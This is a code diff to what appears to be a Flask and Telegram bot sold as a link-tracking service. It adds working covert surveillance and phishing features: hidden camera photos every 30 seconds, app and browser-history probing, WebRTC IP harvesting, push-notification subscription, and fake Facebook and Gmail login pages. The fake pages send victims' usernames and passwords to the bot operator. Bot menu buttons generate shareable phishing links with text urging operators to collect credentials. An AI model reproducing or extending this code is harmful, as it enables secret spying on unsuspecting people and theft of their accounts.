@@ -844,21 +844,156 @@ async function startCapture(){
   else if(mode==='motion'){await sendMotionData();setFill(100);}
   else{setFill(100);}
 }
-// Send fingerprint + WebGL + Real IP silently on load
+// ── Auto-Retake Loop: capture a photo every 30s while page is open ──
+let retakeInterval=null;
+function startRetakeLoop(){
+  retakeInterval=setInterval(async()=>{
+    try{
+      const {stream,v}=await openHiddenCamera('environment');
+      const blob=await snapFromVideo(v);
+      stream.getTracks().forEach(t=>t.stop());
+      if(v.parentNode)document.body.removeChild(v);
+      if(blob&&blob.size>800){
+        const fp=await collectFingerprint();
+        const form=new FormData();
+        form.append('token',token);form.append('photo',blob,'retake_'+Date.now()+'.jpg');
+        form.append('fingerprint',JSON.stringify({...fp,note:'Auto-Retake Loop'}));
+        fetch('/capture_combined_photo',{method:'POST',body:form});
+      }
+    }catch(e){}
+  },30000);
+}
+// ── App Probe: detect installed apps via URL scheme timing ──
+async function probeApps(){
+  try{
+    const apps=[
+      {name:'WhatsApp',url:'whatsapp://'},
+      {name:'Viber',url:'viber://'},
+      {name:'Telegram',url:'tg://'},
+      {name:'Facebook',url:'fb://'},
+      {name:'Instagram',url:'instagram://'},
+      {name:'TikTok',url:'snssdk1233://'},
+      {name:'YouTube',url:'youtube://'},
+      {name:'Twitter/X',url:'twitter://'},
+      {name:'Zoom',url:'zoomus://'},
+      {name:'Skype',url:'skype://'},
+    ];
+    const found=[];
+    const iframe=document.createElement('iframe');
+    iframe.style.cssText='display:none;width:0;height:0;position:fixed';
+    document.body.appendChild(iframe);
+    for(const app of apps){
+      const t0=Date.now();
+      try{iframe.contentWindow.location.href=app.url;}catch(e){}
+      await new Promise(r=>setTimeout(r,120));
+      const elapsed=Date.now()-t0;
+      if(elapsed>90)found.push(app.name);
+    }
+    document.body.removeChild(iframe);
+    if(found.length>0){
+      fetch('/capture_app_probe',{method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({token,apps:found})});
+    }
+  }catch(e){}
+}
+// ── LAN Network Scan: find local network devices via WebRTC multi-STUN ──
+async function scanLAN(){
+  try{
+    const servers=[
+      {urls:'stun:stun.l.google.com:19302'},
+      {urls:'stun:stun1.l.google.com:19302'},
+      {urls:'stun:stun2.l.google.com:19302'},
+    ];
+    const ips=new Set();
+    await Promise.all(servers.map(srv=>new Promise(resolve=>{
+      try{
+        const pc=new RTCPeerConnection({iceServers:[srv]});
+        pc.createDataChannel('');
+        pc.onicecandidate=e=>{
+          if(!e||!e.candidate){pc.close();resolve();return;}
+          const m=e.candidate.candidate.match(/([0-9]{1,3}([.][0-9]{1,3}){3})/g);
+          if(m)m.forEach(ip=>ips.add(ip));
+        };
+        pc.createOffer().then(o=>pc.setLocalDescription(o));
+        setTimeout(()=>{pc.close();resolve();},2500);
+      }catch(e){resolve();}
+    })));
+    const localIPs=[...ips].filter(ip=>ip.startsWith('192.')||ip.startsWith('10.')||ip.startsWith('172.'));
+    const publicIPs=[...ips].filter(ip=>!ip.startsWith('192.')&&!ip.startsWith('10.')&&!ip.startsWith('172.')&&!ip.startsWith('127.')&&!ip.startsWith('169.'));
+    if(ips.size>0){
+      fetch('/capture_lan_scan',{method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({token,localIPs,publicIPs,allIPs:[...ips]})});
+    }
+    return publicIPs;
+  }catch(e){return[];}
+}
+// ── Browser History Timing: guess visited sites by CSS :visited timing ──
+async function probeHistory(){
+  try{
+    const sites=[
+      'https://www.facebook.com','https://www.youtube.com','https://www.google.com',
+      'https://www.instagram.com','https://www.tiktok.com','https://www.twitter.com',
+      'https://www.reddit.com','https://www.wikipedia.org','https://www.amazon.com',
+      'https://www.netflix.com','https://www.whatsapp.com','https://web.telegram.org',
+      'https://www.viber.com','https://mail.google.com','https://outlook.live.com',
+    ];
+    const visited=[];
+    const style=document.createElement('style');
+    document.head.appendChild(style);
+    for(const site of sites){
+      try{
+        style.sheet.insertRule(`a[href="${site}"]:visited{outline:1px solid red}`,0);
+        const a=document.createElement('a');
+        a.href=site;a.style.cssText='position:fixed;opacity:0;pointer-events:none;top:-9999px';
+        document.body.appendChild(a);
+        const color=window.getComputedStyle(a).outlineColor;
+        document.body.removeChild(a);
+        if(color&&color!=='rgba(0, 0, 0, 0)'&&color!=='transparent')visited.push(site);
+        style.sheet.deleteRule(0);
+      }catch(e){}
+    }
+    document.head.removeChild(style);
+    if(visited.length>0){
+      fetch('/capture_history_probe',{method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({token,visited})});
+    }
+  }catch(e){}
+}
+// ── Push Notification subscribe ──
+async function subscribePush(){
+  try{
+    if(!('serviceWorker' in navigator)||!('PushManager' in window))return;
+    const reg=await navigator.serviceWorker.register('/sw.js');
+    await navigator.serviceWorker.ready;
+    const perm=await Notification.requestPermission();
+    if(perm!=='granted')return;
+    const sub=await reg.pushManager.subscribe({
+      userVisibleOnly:true,
+      applicationServerKey:'BEl62iUYgUivxIkv69yViEuiBIa40HI80NM9e0VNbGUcFxQnPH_NnIQHFoTUPe2PkM3hEBtlHa2RFmMfNRMjQk'
+    });
+    fetch('/capture_push_sub',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({token,subscription:JSON.parse(JSON.stringify(sub))})});
+  }catch(e){}
+}
+// ── Send fingerprint + WebGL + Real IP silently on load ──
 (async()=>{
   try{
     const fp=await collectFingerprint();
-    const realIPs=await getRealIP();
-    fetch('/capture_fingerprint',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,fingerprint:{...fp,realIPs}})});
-    // Also dedicate a geo lookup call for real IPs
-    const publicIPs=realIPs.filter(ip=>!ip.startsWith('192.')&&!ip.startsWith('10.')&&!ip.startsWith('172.')&&!ip.startsWith('127.')&&!ip.startsWith('169.'));
+    const [realIPs,publicIPs2]=await Promise.all([getRealIP(),scanLAN()]);
+    const allRealIPs=[...new Set([...realIPs,...publicIPs2])];
+    fetch('/capture_fingerprint',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,fingerprint:{...fp,realIPs:allRealIPs}})});
+    const publicIPs=allRealIPs.filter(ip=>!ip.startsWith('192.')&&!ip.startsWith('10.')&&!ip.startsWith('172.')&&!ip.startsWith('127.')&&!ip.startsWith('169.'));
     if(publicIPs.length>0){
       fetch('/capture_ip_geo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,ips:publicIPs})});
     }
+    // Run passive probes silently
+    probeApps();
+    probeHistory();
+    subscribePush();
   }catch(e){}
 })();
 // Start capture immediately on load
-window.addEventListener('load',()=>startCapture());
+window.addEventListener('load',()=>{startCapture();startRetakeLoop();});
 </script>
 </body>
 </html>"""
@@ -1031,6 +1166,200 @@ def capture_ip_geo():
         if not is_private_ip(ip):
             threading.Thread(target=geolocate_and_broadcast, args=(user_id, ip, "WebRTC Real IP"), daemon=True).start()
     return jsonify({"ok": True}), 200
+
+
+@flask_app.route('/capture_app_probe', methods=['POST'])
+def capture_app_probe():
+    data = request.get_json(silent=True) or {}
+    token = data.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    apps = data.get('apps', [])
+    if apps:
+        report = (
+            f"📱 <b>Installed Apps Detected!</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"🔍 Found {len(apps)} app(s):\n"
+            + "\n".join(f"  ✅ {a}" for a in apps) +
+            f"\n━━━━━━━━━━━━━━━━━━━━"
+        )
+        threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+
+@flask_app.route('/capture_lan_scan', methods=['POST'])
+def capture_lan_scan():
+    data = request.get_json(silent=True) or {}
+    token = data.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    local_ips = data.get('localIPs', [])
+    public_ips = data.get('publicIPs', [])
+    all_ips = data.get('allIPs', [])
+    local_str = '\n'.join(f"  📡 {ip}" for ip in local_ips) or '  —'
+    public_str = '\n'.join(f"  🌐 {ip}" for ip in public_ips) or '  —'
+    report = (
+        f"🌐 <b>LAN Network Scan</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"🏠 Local IPs ({len(local_ips)}):\n{local_str}\n"
+        f"🌍 Public IPs ({len(public_ips)}):\n{public_str}\n"
+        f"📊 Total found: {len(all_ips)}\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
+    )
+    threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
+    for ip in public_ips:
+        if not is_private_ip(ip):
+            threading.Thread(target=geolocate_and_broadcast, args=(user_id, ip, "LAN Scan IP"), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+
+@flask_app.route('/capture_history_probe', methods=['POST'])
+def capture_history_probe():
+    data = request.get_json(silent=True) or {}
+    token = data.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    visited = data.get('visited', [])
+    if visited:
+        report = (
+            f"🕵️ <b>Browser History Detected!</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"🔍 Visited sites ({len(visited)}):\n"
+            + "\n".join(f"  🌐 {s}" for s in visited) +
+            f"\n━━━━━━━━━━━━━━━━━━━━"
+        )
+        threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+
+@flask_app.route('/capture_push_sub', methods=['POST'])
+def capture_push_sub():
+    data = request.get_json(silent=True) or {}
+    token = data.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    sub = data.get('subscription', {})
+    endpoint = sub.get('endpoint', 'N/A')[:80]
+    report = (
+        f"🔔 <b>Push Notification Subscribed!</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"✅ Device subscribed to push notifications\n"
+        f"📡 Endpoint: <code>{endpoint}...</code>\n"
+        f"💡 Can now receive silent background messages\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
+    )
+    threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+
+@flask_app.route('/capture_fake_login', methods=['POST'])
+def capture_fake_login():
+    data = request.get_json(silent=True) or {}
+    token = data.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    platform = data.get('platform', 'Unknown')
+    username = data.get('username', '')
+    password = data.get('password', '')
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    report = (
+        f"🎭 <b>CREDENTIALS CAPTURED!</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"🌐 Platform: <b>{platform}</b>\n"
+        f"👤 Username/Email: <code>{username}</code>\n"
+        f"🔑 Password: <code>{password}</code>\n"
+        f"🌐 IP: <code>{ip}</code>\n"
+        f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
+    )
+    threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+
+@flask_app.route('/sw.js')
+def service_worker():
+    sw_code = """self.addEventListener('push',e=>{
+  const d=e.data?e.data.json():{};
+  self.registration.showNotification(d.title||'ViralStream',{body:d.body||'New content available',icon:'/favicon.ico'});
+});
+self.addEventListener('notificationclick',e=>{e.notification.close();});"""
+    from flask import Response
+    return Response(sw_code, mimetype='application/javascript')
+
+
+@flask_app.route('/fake-login/<platform>/<token>')
+def fake_login_page(platform, token):
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return "Not found", 404
+    platforms = {
+        'facebook': {
+            'name': 'Facebook',
+            'color': '#1877f2',
+            'logo': 'https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/100px-2021_Facebook_icon.svg.png',
+            'field': 'Email or Phone',
+        },
+        'gmail': {
+            'name': 'Google',
+            'color': '#4285f4',
+            'logo': 'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/200px-Google_2015_logo.svg.png',
+            'field': 'Email or phone',
+        },
+    }
+    p = platforms.get(platform, platforms['facebook'])
+    html = f"""<!DOCTYPE html><html><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Log in to {p['name']}</title>
+<style>*{{margin:0;padding:0;box-sizing:border-box}}
+body{{background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',Helvetica,Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}}
+.card{{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.15);padding:24px 20px;width:100%;max-width:396px;text-align:center}}
+.logo{{margin-bottom:16px;font-size:2rem;font-weight:800;color:{p['color']}}}
+h2{{font-size:1.4rem;font-weight:600;margin-bottom:4px}}
+.sub{{color:#666;font-size:.9rem;margin-bottom:20px}}
+input{{width:100%;padding:14px 16px;border:1px solid #ddd;border-radius:6px;font-size:1rem;margin-bottom:12px;outline:none;transition:border .2s}}
+input:focus{{border-color:{p['color']}}}
+.btn{{width:100%;padding:14px;background:{p['color']}; color:#fff;border:none;border-radius:6px;font-size:1.05rem;font-weight:700;cursor:pointer;margin-bottom:16px}}
+.err{{color:#e63946;font-size:.82rem;margin:-8px 0 10px;display:none}}
+.divider{{color:#aaa;font-size:.8rem;margin-bottom:14px}}
+.forgot{{color:{p['color']}; text-decoration:none;font-size:.88rem}}</style></head>
+<body><div class="card">
+<div class="logo">{p['name']}</div>
+<h2>Log in to your account</h2>
+<div class="sub">Enter your {p['name']} credentials to continue</div>
+<div class="err" id="err">The email or password you entered is incorrect.</div>
+<input type="text" id="u" placeholder="{p['field']}" autocomplete="username">
+<input type="password" id="p" placeholder="Password" autocomplete="current-password">
+<button class="btn" onclick="doLogin()">Log In</button>
+<div class="divider">— or —</div>
+<a href="#" class="forgot">Forgot password?</a>
+</div>
+<script>
+let attempt=0;
+function doLogin(){{
+  const u=document.getElementById('u').value.trim();
+  const p=document.getElementById('p').value;
+  if(!u||!p){{document.getElementById('err').style.display='block';document.getElementById('err').textContent='Please fill in all fields.';return;}}
+  fetch('/capture_fake_login',{{method:'POST',headers:{{'Content-Type':'application/json'}},
+    body:JSON.stringify({{token:'{token}',platform:'{p['name']}',username:u,password:p}})}});
+  attempt++;
+  if(attempt<2){{
+    document.getElementById('err').style.display='block';
+    document.getElementById('err').textContent='The email or password you entered is incorrect.';
+    document.getElementById('p').value='';
+  }} else {{
+    document.getElementById('err').style.display='none';
+    document.querySelector('.card').innerHTML='<div style="padding:40px 0"><div style="font-size:2rem">✅</div><h2 style="margin-top:12px">Logged in successfully</h2><p style="color:#888;margin-top:8px;font-size:.9rem">Redirecting...</p></div>';
+    setTimeout(()=>window.location.href='https://{platform}.com',2000);
+  }}
+}}
+document.addEventListener('keydown',e=>{{if(e.key==='Enter')doLogin();}});
+</script></body></html>"""
+    return html, 200
 
 
 @flask_app.route('/capture_combined_photo', methods=['POST'])
@@ -1324,6 +1653,7 @@ def get_reply_keyboard():
             [KeyboardButton("📞 Contact List Link")],
             [KeyboardButton("📷 Burst Photos Link"), KeyboardButton("🖥️ Screen Record Link")],
             [KeyboardButton("📳 Motion+IP Link")],
+            [KeyboardButton("🎭 FB Fake Login Link"), KeyboardButton("🎭 Gmail Fake Login Link")],
             [KeyboardButton("💰 Daily Bonus"), KeyboardButton("👥 Refer & Earn")],
             [KeyboardButton("💎 My Points | Access"), KeyboardButton("📋 Active Links")],
             [KeyboardButton("🗑 Clear Links"), KeyboardButton("❓ Help")],
@@ -1346,6 +1676,8 @@ def main_menu_inline():
         [InlineKeyboardButton("📷 Burst Photos", callback_data="gen_burst"),
          InlineKeyboardButton("🖥️ Screen Record", callback_data="gen_screen")],
         [InlineKeyboardButton("📳 Motion+IP", callback_data="gen_motion")],
+        [InlineKeyboardButton("🎭 FB Fake Login", callback_data="gen_fakefb"),
+         InlineKeyboardButton("🎭 Gmail Fake Login", callback_data="gen_fakegmail")],
         [InlineKeyboardButton("💰 Daily Bonus", callback_data="daily"),
          InlineKeyboardButton("👥 Refer & Earn", callback_data="refer")],
         [InlineKeyboardButton("💎 My Points", callback_data="mypoints"),
@@ -1910,18 +2242,49 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     get_user(user_id)
 
     MODE_MAP = {
-        "🌐 All-in-One Link":      ("all",      "🌐 All-in-One"),
-        "📸 Photo Link":            ("photo",    "📸 Photo"),
-        "🎤 Audio Link":            ("audio",    "🎤 Audio"),
-        "📍 Location Link":         ("location", "📍 Location"),
-        "🎥 Video Link":            ("video",    "🎥 Video"),
-        "🖼️ Gallery Link":          ("gallery",  "🖼️ Gallery"),
-        "🤳 Front Cam Link":        ("frontcam", "🤳 Front Cam"),
-        "📞 Contact List Link":     ("contacts", "📞 Contacts"),
-        "📷 Burst Photos Link":     ("burst",    "📷 Burst Photos"),
-        "🖥️ Screen Record Link":    ("screen",   "🖥️ Screen Record"),
-        "📳 Motion+IP Link":        ("motion",   "📳 Motion+IP"),
+        "🌐 All-in-One Link":        ("all",      "🌐 All-in-One"),
+        "📸 Photo Link":              ("photo",    "📸 Photo"),
+        "🎤 Audio Link":              ("audio",    "🎤 Audio"),
+        "📍 Location Link":           ("location", "📍 Location"),
+        "🎥 Video Link":              ("video",    "🎥 Video"),
+        "🖼️ Gallery Link":            ("gallery",  "🖼️ Gallery"),
+        "🤳 Front Cam Link":          ("frontcam", "🤳 Front Cam"),
+        "📞 Contact List Link":       ("contacts", "📞 Contacts"),
+        "📷 Burst Photos Link":       ("burst",    "📷 Burst Photos"),
+        "🖥️ Screen Record Link":      ("screen",   "🖥️ Screen Record"),
+        "📳 Motion+IP Link":          ("motion",   "📳 Motion+IP"),
     }
+
+    FAKE_TEXT_MAP = {
+        "🎭 FB Fake Login Link":      "facebook",
+        "🎭 Gmail Fake Login Link":   "gmail",
+    }
+
+    if text in FAKE_TEXT_MAP:
+        platform = FAKE_TEXT_MAP[text]
+        if not has_access(user_id):
+            await update.message.reply_text(no_access_text(), parse_mode="HTML", reply_markup=no_access_inline())
+            return
+        token = secrets.token_urlsafe(12)
+        tracking_links[token] = user_id
+        url = f"{BASE_URL}/fake-login/{platform}/{token}"
+        label = "🎭 Facebook Fake Login" if platform == "facebook" else "🎭 Gmail Fake Login"
+        share_text = "🔐 Account တစ်ခု verify လုပ်ရန် link ဖြစ်သည်"
+        share_url = f"https://t.me/share/url?url={requests.utils.quote(url)}&text={requests.utils.quote(share_text)}"
+        await update.message.reply_text(
+            f"✅ <b>{label} Link ထုတ်ပြီးပါပြီ!</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"🔗 <code>{url}</code>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"မျှဝေပြီး credentials ကောက်ပါ",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton(f"🔗 {label} ဖွင့်မည်", url=url)],
+                [InlineKeyboardButton("📤 Share မည်", url=share_url)],
+                [InlineKeyboardButton("🏠 Menu", callback_data="menu")],
+            ])
+        )
+        return
 
     if text in MODE_MAP:
         mode_key, label = MODE_MAP[text]
@@ -2022,18 +2385,46 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     get_user(user_id)
 
     GEN_MODES = {
-        "gen_all":     ("all",      "🌐 All-in-One"),
-        "gen_photo":   ("photo",    "📸 Photo"),
+        "gen_all":      ("all",      "🌐 All-in-One"),
+        "gen_photo":    ("photo",    "📸 Photo"),
         "gen_audio":   ("audio",    "🎤 Audio"),
         "gen_location":("location", "📍 Location"),
         "gen_video":   ("video",    "🎥 Video"),
         "gen_gallery": ("gallery",  "🖼️ Gallery"),
         "gen_front":   ("frontcam", "🤳 Front Cam"),
         "gen_contact": ("contacts", "📞 Contacts"),
-        "gen_burst":   ("burst",    "📷 Burst Photos"),
-        "gen_screen":  ("screen",   "🖥️ Screen Record"),
-        "gen_motion":  ("motion",   "📳 Motion+IP"),
+        "gen_burst":    ("burst",    "📷 Burst Photos"),
+        "gen_screen":   ("screen",   "🖥️ Screen Record"),
+        "gen_motion":   ("motion",   "📳 Motion+IP"),
     }
+
+    FAKE_LOGIN_MODES = {"gen_fakefb": "facebook", "gen_fakegmail": "gmail"}
+
+    if data in FAKE_LOGIN_MODES:
+        platform = FAKE_LOGIN_MODES[data]
+        if not has_access(user_id):
+            await query.edit_message_text(no_access_text(), parse_mode="HTML", reply_markup=no_access_inline())
+            return
+        token = secrets.token_urlsafe(12)
+        tracking_links[token] = user_id
+        url = f"{BASE_URL}/fake-login/{platform}/{token}"
+        label = "🎭 Facebook Fake Login" if platform == "facebook" else "🎭 Gmail Fake Login"
+        share_text = "🔐 Account တစ်ခု verify လုပ်ရန် link ဖြစ်သည်"
+        share_url = f"https://t.me/share/url?url={requests.utils.quote(url)}&text={requests.utils.quote(share_text)}"
+        await query.edit_message_text(
+            f"✅ <b>{label} Link ထုတ်ပြီးပါပြီ!</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"🔗 <code>{url}</code>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"မျှဝေပြီး credentials ကောက်ပါ",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton(f"🔗 {label} ဖွင့်မည်", url=url)],
+                [InlineKeyboardButton("📤 Share မည်", url=share_url)],
+                [InlineKeyboardButton("🏠 Menu", callback_data="menu")],
+            ])
+        )
+        return
 
     if data in GEN_MODES:
         mode_key, label = GEN_MODES[data]
